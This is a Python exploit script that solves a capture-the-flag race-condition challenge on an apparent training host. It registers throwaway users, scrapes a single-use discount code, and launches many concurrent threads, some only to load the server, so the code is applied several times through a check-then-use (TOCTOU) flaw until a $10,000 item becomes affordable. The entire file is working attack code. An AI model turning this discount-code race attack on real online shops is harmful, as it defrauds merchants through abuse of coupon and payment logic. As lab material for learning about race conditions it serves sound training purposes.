# Race Condition Challenge, we gonna create a user, use the discount code available from the html page and buy the flag
# Problem we only have $5 dollars and the flag costs $10000 so we need to use the discount code multiple times because it is invalid after one use
# Then there is a TOCTOU vulnerability, we can use the discount code multiple times if we use it in the same time as the server is checking it

import requests
import threading
import time
import string
import random

base_url = "http://discount.training.offdef.it/"

def find_n(price): # How many times we need to use the discount code to get the flag
    n = 0
    while price > 5:
        price /= 2
        n += 1
    return n

def register(session, username, password):
    data = {
        "username": username,
        "password": password
    }
    r = session.post(base_url + "register", data=data)
    # Use your discount code! Code: IAMBIBT7J9</div>
    return r.text.split("Code: ")[1].split("</div>")[0]

def use_code(session, code):
    session.post(base_url + "apply_discount", data={"discount": code})

def add_to_cart(session, item_id):
    r = session.get(base_url + "add_to_cart?item_id=" + str(item_id))

def pay_and_check(session):
    session.get(base_url + "cart/pay")
    items = session.get(base_url + "items").text
    if "flag" in items:
        print('flag{' + items.split("flag{")[1].split("}")[0] + '}')
    else:
        print('No flag :( let\'s try again')

def fake_user():
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
    password = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
    return username, password

while True:
    s = requests.Session()

    username, password = fake_user()

    to_buy = 21 # The flag is item 21

    code = register(s, username, password)

    n = find_n(10000) # Number of times we need to use the discount code to get the flag

    add_to_cart(s, to_buy) # Add the flag to the cart

    threads = []
    for i in range(100): # Why this? To make the server busy and make the TOCTOU more likely
        threads.append(threading.Thread(target=add_to_cart, args=(s, i)))
    for _ in range(n):
        threads.append(threading.Thread(target=use_code, args=(s, code)))

    for t in threads:
        t.start()

    for t in threads:
        t.join()

    pay_and_check(s)

    time.sleep(0.2)